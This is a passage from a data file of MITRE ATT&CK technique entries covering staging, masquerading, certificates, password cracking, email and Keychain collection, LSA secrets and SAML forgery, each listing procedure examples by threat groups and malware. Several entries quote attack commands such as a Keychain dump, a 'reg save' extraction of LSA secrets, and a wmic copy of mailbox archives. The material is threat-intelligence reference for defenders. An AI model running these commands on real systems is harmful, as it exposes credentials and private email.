command output and collected data in files before exfiltration.', '[Mis-Type] has temporarily stored collected information to the files `“%AppData%\\{Unique Identifier}\\HOSTRURKLSR”` and `“%AppData%\\{Unique Identifier}\\NEWERSSEMP”`.', '[SocGholish] can send output from `whoami` to a local temp file using the naming convention `rad<5-hex-chars>.tmp`.', '[Dragonfly] has created a directory named ""out"" in the user\'s %AppData% folder and copied files to it.', '[BoxCaon] has created a working folder for collected files that it sends to the C2 server. ', '[NETWIRE] has the ability to write collected data to a file created in the <code>./LOGS</code> directory.', '[FLASHFLOOD] stages data it copies from the local system or removable drives in the ""%WINDIR%\\$NtUninstallKB885884$\\"" directory.', '[FIN13] has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: `C:\\Windows\\Temp` and `/tmp`.', '[APT28] has stored captured credential information in a file named pi.log.', '[KOPILUWAK] has piped the results from executed C2 commands to `%TEMP%\\result2.dat` on the local machine.', '[Astaroth] collects data in a plaintext file named r1.log before exfiltration. ', '[STARWHALE] has stored collected data in a file called `stari.txt`.', '[PUNCHTRACK] aggregates collected data in a tmp file.', '[ECCENTRICBANDWAGON] has stored keystrokes and screenshots within the <code>%temp%\\GoogleChrome</code>, <code>%temp%\\Downloads</code>, and <code>%temp%\\TrendMicroUpdate</code> directories.', '[Volt Typhoon] has saved stolen files including the ntds.dit database and the `SYSTEM` and `SECURITY` Registry hives locally to the `C:\\Windows\\Temp\\` directory.', '[PACEMAKER] has written extracted data to `tmp/dsserver-check.statementcounters`.', '[USBStealer] collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration.', '[TEMP.Veles] has created staging folders in directories that were infrequently used by legitimate users or processes.', '[Operation Wocao] has staged archived files in a temporary directory prior to exfiltration.\t', '[Honeybee] adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.', '[Dragonfly 2.0] created a directory named ""out"" in the user\'s %AppData% folder and copied files to it.', '[Machete] created their own directories to drop files into.', 'TRINITY malware used by [FIN6] identifies payment card track data on the victim and then copies it to a local file in a subdirectory of <code>C:\\Windows\\</code>.']",False
T1036.005,Match Legitimate Name or Location,"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.  Adversaries may also use the same icon of the file they are trying to mimic.","['[Misdat] saves itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.', '[RainyDay] has used names to mimic legitimate software including ""vmtoolsd.exe"" to spoof Vmtools.', '[TeamTNT] has replaced .dockerd and .dockerenv with their own scripts and cryptocurrency mining software.', '[MechaFlounder] has been downloaded as a file named lsass.exe, which matches the legitimate Windows file.', '[PcShare] has been named `wuauclt.exe` to appear as the legitimate Windows Update AutoUpdate Client.', '[SLOTHFULMEDIA] has mimicked the names of known executables, such as mediaplayer.exe.', 'If installing itself as a service fails, [Elise] instead writes itself as a file named svchost.exe saved in %APPDATA%\\Microsoft\\Network.', '[OwaAuth] uses the filename owaauth.dll, which is a legitimate file that normally resides in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\</code>; the malicious file by the same name is saved in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\</code>.', 'During the [2016 Ukraine Electric Power Attack] DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.', '[Bundlore] has disguised a malicious .app file as a Flash Player update.', '[S-Type] may save itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.', '[DanBot] files have been named `UltraVNC.exe` and `WINVNC.exe` to appear as legitimate VNC tools.', '[Cyclops Blink] can rename its running process to <code>[kworker:0/1]</code> to masquerade as a Linux kernel thread. [Cyclops Blink] has also named RC scripts used for persistence after WatchGuard artifacts.', '[Gamaredon Group] has used legitimate process names to hide malware including <code>svchosst</code>.', '[TinyTurla] has been deployed as `w64time.dll` to appear legitimate.', '[Carberp] has masqueraded as Windows system file names, as well as ""chkntfs.exe"" and ""syscron.exe"".', '[Volt Typhoon] has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.', '[BRONZE BUTLER] has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.', '[Pony] has used the Adobe Reader icon for the downloaded file to look more trustworthy.\t', '[NightClub] has chosen file names to appear legitimate including EsetUpdate-0117583943.exe for its dropper.', '[TA2541] has used file names to mimic legitimate Windows files or system functionality.', '[IceApple] .NET assemblies have used `App_Web_` in their file names to appear legitimate.', '[Felismus] has masqueraded as legitimate Adobe Content Management System files.', '[APT41] attempted to masquerade their files as popular anti-virus software.', '[REvil] can mimic the names of known executables.', '[Grandoreiro] has named malicious browser extensions and update files to appear legitimate.', '[Indrik Spider] used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.', '[FIN7] has attempted to run Darkside ransomware with the filename sleep.exe.', 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.', '[Skidmap] has created a fake <code>rm</code> binary to replace the legitimate Linux binary.', '[Ninja] has used legitimate looking filenames for its loader including update.dll and x64.dll.', 'For [C0018] the threat actors renamed a [Sliver] payload to `vmware_kb.exe`.', 'During the [SolarWinds Compromise] [APT29] renamed software and DLLs with legitimate names to appear benign.', '[Mustard Tempest] has used the filename `AutoUpdater.js` to mimic legitimate update files and has also used the Cyrillic homoglyph characters С `(0xd0a1)` and а `(0xd0b0)`, to produce the filename `Сhrome.Updаte.zip`.', '[Tarrask] has masqueraded as executable files such as `winupdate.exe`, `date.exe`, or `win.exe`.   ', '[OLDBAIT] installs itself in <code>%ALLUSERPROFILE%\\\\Application Data\\Microsoft\\MediaPlayer\\updatewindws.exe</code>; the directory name is missing a space and the file name is missing the letter ""o.""', '[Sibot] has downloaded a DLL to the <code>C:\\windows\\system32\\drivers\\</code> folder and renamed it with a <code>.sys</code> extension.', '[MuddyWater] has disguised malicious executables and used filenames and Registry key names associated with Windows Defender.', '[PyDCrypt] has dropped [DCSrv] under the `svchost.exe` name to disk. ', '[WIRTE] has named a first stage dropper `Kaspersky Update Agent` in order to appear legitimate.', '[Patchwork] installed its payload in the startup programs folder as ""Baidu Software Update."" The group also adds its second stage payload to the startup programs as “Net Monitor."" They have also dropped [QuasarRAT] binaries as files named microsoft_network.exe and crome.exe.', '[BLINDINGCAN] has attempted to hide its payload by using legitimate file names such as ""iconcache.db"".', '[HermeticWizard] has been named `exec_32.dll` to mimic a legitimate MS Outlook .dll.', '[RDAT] has masqueraded as VMware.exe.\t', 'The [Remsec] loader implements itself with the name Security Support Provider, a legitimate Windows function. Various [Remsec] .exe files mimic legitimate file names used by Microsoft, Symantec, Kaspersky, Hewlett-Packard, and VMWare. [Remsec] also disguised malicious modules using similar filenames as custom network encryption software on victims.', '[ANDROMEDA] has been installed to `C:\\Temp\\TrustedInstaller.exe` to mimic a legitimate Windows installer service.', '[Raindrop] was installed under names that resembled legitimate Windows file and directory names.', '[Transparent Tribe] can mimic legitimate Windows directories by using the same icons and names.', '[admin@338] actors used the following command to rename one of their tools to a benign file name: <code>ren ""%temp%\\upload"" audiodg.exe</code>', 'During the [C0032] campaign, [TEMP.Veles] renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.', '[Earth Lusca] used the command `move [file path] c:\\windows\\system32\\spool\\prtprocs\\x64\\spool.dll` to move and register a malicious DLL name as a Windows print processor, which eventually was loaded by the Print Spooler service.', '[Mis-Type] saves itself as a file named `msdtc.exe`, which is also the name of the legitimate Microsoft Distributed Transaction Coordinator service binary.', '[BackdoorDiplomacy] has dropped implants in folders named for legitimate software.', '[KGH_SPY] has masqueraded as a legitimate Windows tool.', '[Bad Rabbit] has masqueraded as a Flash Player installer through the executable file <code>install_flash_player.exe</code>.', 'One of [Dtrack] can hide in replicas of legitimate programs like OllyDbg, 7-Zip, and FileZilla.', ""[Ferocious Kitten] has named malicious files <code>update.exe</code> and loaded them into the compromise host's “Public” folder."", '[SUGARDUMP] has been named `CrashReporter.exe` to appear as a legitimate Mozilla executable.', '[PUNCHBUGGY] mimics filenames from %SYSTEM%\\System32 to hide DLLs in %WINDIR% and/or %TEMP%.', '[Octopus] has been disguised as legitimate programs, such as Java and Telegram Messenger.', '[Ryuk] has constructed legitimate appearing installation folder paths by calling <code>GetWindowsDirectoryW</code> and then inserting a null byte at the fourth character of the path. For Windows Vista or higher, the path would appear as <code>C:\\Users\\Public</code>.', '[HTTPBrowser] installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.', '[Brute Ratel C4] has used a payload file named OneDrive.update to appear benign.', '[NOKKI] is written to %LOCALAPPDATA%\\MicroSoft Updatea\\svServiceUpdate.exe prior being executed in a new process in an apparent attempt to masquerade as a legitimate folder and file.', '[LightNeuron] has used filenames associated with Exchange and Outlook for binary and configuration files, such as <code>winmail.dat</code>.', '[APT29] has renamed malicious DLLs with legitimate names to appear benign; they have also created an Azure AD certificate with a Common Name that matched the display name of the compromised service principal.', '[APT28] has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.', 'During [Operation CuckooBees] the threat actors renamed a malicious executable to `rundll32.exe` to allow it to blend in with other Windows system files.', '[Penquin] has mimicked the Cron binary to hide itself on compromised systems.', '[LookBack] has a C2 proxy tool that masquerades as <code>GUP.exe</code>, which is software used by Notepad++.', '[GoldenSpy] setup file installs initial executables under the folder <code>%WinDir%\\System32\\PluginManager</code>.\t', '[Naikon] has disguised malicious programs as Google Chrome, Adobe, and VMware executables.', '[AppleSeed] has the ability to rename its payload to ESTCommon.dll to masquerade as a DLL belonging to ESTsecurity.', '[SocGholish] has been named `AutoUpdater.js` to mimic legitimate update files.', '[Small Sieve] can use variations of Microsoft and Outlook spellings, such as ""Microsift"", in its file names to avoid detection.', '[Ursnif] has used strings from legitimate system files and existing folders for its file, folder, and Registry entry names.', '[Machete] renamed payloads to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python executables.', '[Chimera] has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.', '[ThiefQuest] prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.', '[ShimRatReporter] spoofed itself as <code>AlphaZawgyl_font.exe</code>, a specialized Unicode font.', 'The [Bazar] loader has named malicious shortcuts ""adobe"" and mimicked communications software.', 'The [TAINTEDSCRIBE] main executable has disguised itself as Microsoft’s Narrator.', '[DRATzarus] has been named `Flash.exe`, and its dropper has been named `IExplorer`.', '[Bumblebee] has named component DLLs ""RapportGP.dll"" to match those used by the security company Trusteer.', '[APT32] has renamed a NetCat binary to kb-10233.exe to masquerade as a Windows update. [APT32] has also renamed a Cobalt Strike beacon payload to install_flashplayers.exe. ', '[MCMD] has been named Readme.txt to appear legitimate.', '[StrifeWater] has been named `calc.exe` to appear as a legitimate calculator program.', '[SUNBURST] created VBScripts that were named after existing services or folders to blend into legitimate activities. ', '[Ke3chang] has dropped their malware into legitimate installed software paths including: `C:\\ProgramFiles\\Realtek\\Audio\\HDA\\AERTSr.exe`, `C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitRdr64.exe`, `C:\\Program Files (x86)\\Adobe\\Flash Player\\AddIns\\airappinstaller\\airappinstall.exe`, and `C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd64.exe`.', '[QUADAGENT] used the PowerShell filenames <code>Office365DCOMCheck.ps1</code> and <code>SystemDiskClean.ps1</code>.', '[Ramsay] has masqueraded as a 7zip installer.\t', 'During [C0017] [APT41] used file names beginning with USERS, SYSUSER, and SYSLOG for [DEADEYE] and changed [KEYPLUG] file extensions from .vmp  to .upx likely to avoid hunting detections.', '[Tropic Trooper] has hidden payloads in Flash directories and fake installer files.', '[Magic Hound] has used `dllhost.exe` to mask Fast Reverse Proxy (FRP) and `MicrosoftOutLookUpdater.exe` for Plink.', '[SUPERNOVA] has masqueraded as a legitimate SolarWinds DLL.', '[PlugX] has been disguised as legitimate Adobe and PotPlayer files.', '[OSX/Shlayer] can masquerade as a Flash Player update.', '[Starloader] has masqueraded as legitimate software update packages such as Adobe Acrobat Reader and Intel.', '[Chaes] has used an unsigned, crafted DLL module named <code>hha.dll</code> that was designed to look like a legitimate 32-bit Windows DLL.', '[PROMETHIUM] has disguised malicious installer files by bundling them with legitimate software installers.', '[Aoqin Dragon] has used fake icons including antivirus and external drives to disguise malicious payloads.', '[Shark] binaries have been named `audioddg.pdb` and `Winlangdb.pdb` in order to appear legitimate.', '[FoggyWeb] can be disguised as a Visual Studio file such as `Windows.Data.TimeZones.zh-PH.pri` to evade detection. Also, [FoggyWeb] loader can mimic a genuine `dll` file that carries out the same import functions as the legitimate Windows `version.dll` file.', '[NETWIRE] has masqueraded as legitimate software including TeamViewer and macOS Finder.', '[USBStealer] mimics a legitimate Russian program called USB Disk Security.', '[MarkiRAT] can masquerade as <code>update.exe</code> and <code>svehost.exe</code>; it has also mimicked legitimate Telegram and Chrome files.', 'During [Operation Wocao] the threat actors renamed some tools and executables to appear as legitimate programs.', '[LuminousMoth] has disguised their exfiltration malware as `ZoomVideoApp.exe`.', '[HermeticWiper] has used the name `postgressql.exe` to mask a malicious payload.', '[Whitefly] has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors.', ""[Nebulae] uses functions named <code>StartUserModeBrowserInjection</code> and <code>StopUserModeBrowserInjection</code> indicating that it's trying to imitate chrome_frame_helper.dll."", '[Machete] [Machete] MSI installer has masqueraded as a legitimate Adobe Acrobat Reader installer.', '[KOCTOPUS] has been disguised as legitimate software programs associated with the travel and airline industries. ', '[TEARDROP] files had names that resembled legitimate Window file and directory names.', '[Carbanak] has named malware ""svchost.exe,"" which is the name of the Windows shared service host program.', 'During [Operation Honeybee] the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC. ', ""[Lazarus Group] has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files."", '[Doki] has disguised a file as a Linux kernel module.', '[SUNSPOT] was identified on disk with a filename of <code>taskhostsvc.exe</code> and it created an encrypted log file at <code>C:\\Windows\\Temp\\vmware-vmdmp.log</code>. ', '[GoldMax] has used filenames that matched the system name, and appeared as a scheduled task impersonating systems management software within the corresponding ProgramData subfolder.', '[BADNEWS] attempts to hide its payloads using legitimate filenames.', 'To establish persistence, [SslMM] identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.', '[Darkhotel] has used malware that is disguised as a Secure Shell (SSH) tool.', ""The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by [APT1] as a name for malware."", '[FinFisher] renames one of its .dll files to uxtheme.dll in an apparent attempt to masquerade as a legitimate file.', '[Blue Mockingbird] has masqueraded their XMRIG payload name by naming it wercplsupporte.dll after the legitimate wercplsupport.dll file.', '[Sidewinder] has named malicious files <code>rekeywiz.exe</code> to match the name of a legitimate Windows executable.', '[Saint Bot] has been disguised as a legitimate executable, including as Windows SDK.', '[RotaJakiro] has used the filename `systemd-daemon` in an attempt to appear legitimate.', '[ThreatNeedle] chooses its payload creation path from a randomly selected service name from netsvc.', '[InnaputRAT] variants have attempted to appear legitimate by using the file names SafeApp.exe and NeutralApp.exe.', '[Calisto] installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.', '[PowGoop] has used a DLL named Goopdate.dll to impersonate a legitimate Google update file.', '[Daserf] uses file and folder names related to legitimate programs in order to blend in, such as HP, Intel, Adobe, and perflogs.', '[menuPass] has been seen changing malicious files to appear legitimate.', '[Samurai] has created the directory `%COMMONPROGRAMFILES%\\Microsoft Shared\\wmi\\` to contain DLLs for loading successive stages.', '[Metamorfo] has disguised an MSI file as the Adobe Acrobat Reader Installer and has masqueraded payloads as OneDrive, WhatsApp, or Spotify, for example. ', '[Sowbug] named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory <code>CSIDL_APPDATA\\microsoft\\security</code>.', '[Pysa] has executed a malicious executable by naming it svchost.exe.', '[APT39] has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.', 'The [Black Basta] dropper has mimicked an application for creating USB bootable drivers.', '[Kimsuky] has renamed malware to legitimate names such as <code>ESTCommon.dll</code> or <code>patch.dll</code>.', '[Green Lambert] has been disguised as a Growl help file.', '[APT5] has named exfiltration archives to mimic Windows Updates at times using filenames with a `KB<digits>.zip` pattern.', '[Fysbis] has masqueraded as trusted software rsyncd and dbus-inotifier.', '[Poseidon Group] tools attempt to spoof anti-virus processes as a means of self-defense.', '[Silence] has named its backdoor ""WINWORD.exe"".', '[Chinoxy] has used the name `eoffice.exe` in attempt to appear as a legitimate file.', '[Fox Kitten] has named binaries and configuration files svhost and dllhost respectively to appear legitimate.', '[ChChes] copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).', 'A [Winnti for Windows] implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.', '[ToddyCat] has used the name `debug.exe` for malware components.', '[Goopy] has impersonated the legitimate goopdate.dll, which was dropped on the target system with a legitimate GoogleUpdate.exe.', '[SideCopy] has used a legitimate DLL file name, `Duser.dll` to disguise a malicious remote access tool.', '[Bisonal] has renamed malicious code to `msacm32.dll` to hide within a legitimate library; earlier versions were disguised as `winhelp`. ', '[Ixeshe] has used registry values and file names associated with Adobe software, such as AcroRd32.exe.', '[BackConfig] has hidden malicious payloads in <code>%USERPROFILE%\\Adobe\\Driver\\dwg\\</code> and mimicked the legitimate DHCP service binary.', '[Cuba] has been disguised as legitimate 360 Total Security Antivirus and OpenVPN programs. ', '[PipeMon] modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.', '[Mustang Panda] has used names like `adobeupdate.dat` and `PotPlayerDB.dat` to disguise [PlugX] and a file named `OneDrive.exe` to load a [Cobalt Strike] payload.', '[StrongPity] has been bundled with legitimate software installation files for disguise.', '[Gelsemium] has named malicious binaries `serv.exe`, `winprint.dll`, and `chrome_elf.dll` and has set its persistence in the Registry with the key value <code>Chrome Update</code> to appear legitimate.', '[KONNI] has created a shortcut called ""Anti virus service.lnk"" in an apparent attempt to masquerade as a legitimate file.', '[FIN13] has masqueraded WAR files to look like legitimate packages such as, wsexample.war, wsexamples.com, examples.war, and exampl3s.war.', '[DarkComet] has dropped itself onto victim machines with file names such as WinDefender.Exe and winupdate.exe in an apparent attempt to masquerade as a legitimate file.', '[EKANS] has been disguised as <code>update.exe</code> to appear as a valid executable.', 'During [Operation Sharpshooter] threat actors installed [Rising Sun] in the Startup folder and disguised it as `mssync.exe`.', '[InvisiMole] has disguised its droppers as legitimate software or documents, matching their original names and locations, and saved its files as mpr.dll in the Windows folder.', '[ZLib] mimics the resource version information of legitimate Realtek Semiconductor, Nvidia, or Synaptics modules.', '[QUIETEXIT] has attempted to change its name to `cron` upon startup. During incident response, [QUIETEXIT] samples have been identified that were renamed to blend in with other legitimate files.', '[Sandworm Team] has avoided detection by naming a malicious binary explorer.exe.', '[Rocke] has used shell scripts which download mining executables and saves them with the filename ""java"".', '[TEMP.Veles] has renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files. ', '[TRITON] disguised itself as the legitimate Triconex Trilog application.', '[UNC2452] renamed a version of [AdFind] to <code>sqlceip.exe</code> or <code>csrss.exe</code> in an attempt to appear as the SQL Server Telemetry Client or Client Service Runtime Process, respectively.']",False
T1587.003,Digital Certificates,"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).  Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography] with [Web Protocols] or even enabling [Adversary-in-the-Middle] if added to the root of trust (i.e. [Install Root Certificate]  After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate] on infrastructure under their control.","['[APT29] has created self-signed digital certificates to enable mutual TLS authentication for malware.', '[PROMETHIUM] has created self-signed digital certificates for use in HTTPS C2 traffic.', 'For [C0011] [Transparent Tribe] established SSL certificates on the typo-squatted domains the group registered.']",
T1565.001,Stored Data Manipulation,"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.  Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","['[SUNSPOT] created a copy of the SolarWinds Orion software source file with a <code>.bk</code> extension to backup the original content, wrote [SUNBURST] using the same filename but with a <code>.tmp</code> extension, and then moved [SUNBURST] using <code>MoveFileEx</code> to the original filename with a <code>.cs</code> extension so it could be compiled within Orion software.', '[APT38] has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.']",False
T1110.002,Password Cracking,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping] can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash] is not an option. Further,  adversaries may leverage [Data from Configuration Repository] in order to obtain hashed credentials for network devices.   Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.","['[APT3] has been known to brute force password hashes to be able to leverage plain text credentials.', '[Net Crawler] uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.', '[Dragonfly] has dropped and executed tools used for password cracking, including Hydra and [CrackMapExec]', '[APT41] performed password brute-force attacks on the local admin account.', '[FIN6] has extracted password hashes from ntds.dit to crack offline.', 'During [Night Dragon] threat actors used Cain & Abel to crack password hashes.', '[Dragonfly 2.0] dropped and executed tools used for password cracking, including Hydra and [CrackMapExec]']",False
T1114.001,Local Email Collection,"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.  Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\Users\<username>\Documents\Outlook Files` or `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.","['[Smoke Loader] searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).', '[QakBot] can target and steal locally stored emails to support thread hijacking phishing campaigns.', '[Pupy] can interact with a victim’s Outlook session and look through folders and emails.', '[Carbanak] searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.', '[APT1] uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files.', '[Crimson] contains a command to collect and exfiltrate emails from Outlook.', 'During [Night Dragon] threat actors used RAT malware to exfiltrate email archives.', '[Empire] has the ability to collect emails on a target system.', '[Chimera] has harvested data from victim\'s e-mail including through execution of <code>wmic /node:<ip> process call create ""cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst"" copy ""i:\\<path>\\<username>\\My Documents\\<filename>.pst"" copy</code>.', '[KGH_SPY] can harvest data from mail clients.', '[Magic Hound] has collected .PST archives.', '[CosmicDuke] searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.', '[Out1] can parse e-mails on a target machine.', '[Emotet] has been observed leveraging a module that scrapes email data from Outlook.']",
T1555.001,Keychain,"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service.   Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.  Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain –d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.  ","['[Green Lambert] can use Keychain Services API functions to find and collect passwords, such as `SecKeychainFindInternetPassword` and `SecKeychainItemCopyAttributesAndData`. ', '[Proton] gathers credentials in files for keychains.', '[MacMa] can dump credentials from the macOS keychain.', '[LaZagne] can obtain credentials from macOS Keychains.\t', '[Calisto] collects Keychain storage data and copies those passwords/tokens to a file.', '[iKitten] collects the keychains on the system.']",False
T1003.004,LSA Secrets,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.  [Reg] can be used to extract from the Registry. [Mimikatz] can be used to extract secrets from memory.","['[MuddyWater] has performed credential dumping with [LaZagne]', '[IceApple] Credential Dumper module can dump LSA secrets from registry keys, including: `HKLM\\SECURITY\\Policy\\PolEKList\\default`, `HKLM\\SECURITY\\Policy\\Secrets\\*\\CurrVal`, and `HKLM\\SECURITY\\Policy\\Secrets\\*\\OldVal`.', '[CosmicDuke] collects LSA secrets.', '[gsecdump] can dump LSA secrets.', '[LaZagne] can perform credential dumping from LSA secrets to obtain account and password information.', '[Threat Group-3390] actors have used [gsecdump] to dump credentials. They have also dumped credentials from domain controllers.', '[OilRig] has used credential dumping tools such as [LaZagne] to steal credentials to accounts logged into the compromised system and to Outlook Web Access.', '[CrackMapExec] can dump hashed passwords from LSA secrets for the targeted system.', '[Leafminer] used several tools for retrieving login and password information, including LaZagne.', '[APT33] has used a variety of publicly available tools like [LaZagne] to gather credentials.', '[APT29] has used the `reg save` command to extract LSA secrets offline.', '[menuPass] has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.', '[Dragonfly] has dropped and executed SecretsDump to dump password hashes.', '[AADInternals] can dump secrets from the Local Security Authority.', 'SecretsDump and [Mimikatz] modules within [Impacket] can perform credential dumping to obtain account and password information.', '[Pupy] can use Lazagne for harvesting credentials.', '[Ke3chang] has dumped credentials, including by using gsecdump.', '[Mimikatz] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA.', '[Dragonfly 2.0] dropped and executed SecretsDump to dump password hashes.']",
T1606.002,SAML Tokens,"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.  An adversary may utilize [Private Keys] to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from [Steal Application Access Token] and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.  An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material] which may bypass multi-factor and other authentication protection mechanisms.","['During the [SolarWinds Compromise] [APT29] created tokens using compromised SAML signing certificates.', '[AADInternals] can be used to create SAML tokens using the AD Federated Services token signing certificate.', '[APT29] created tokens using compromised SAML signing certificates.', '[UNC2452] created tokens using compromised SAML signing certificates.']",False
T1036.008,Masquerade File Type,"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`.   Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer] and stored (e.g., [Upload Malware] so that adversaries may move their malware without triggering detections.   Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of 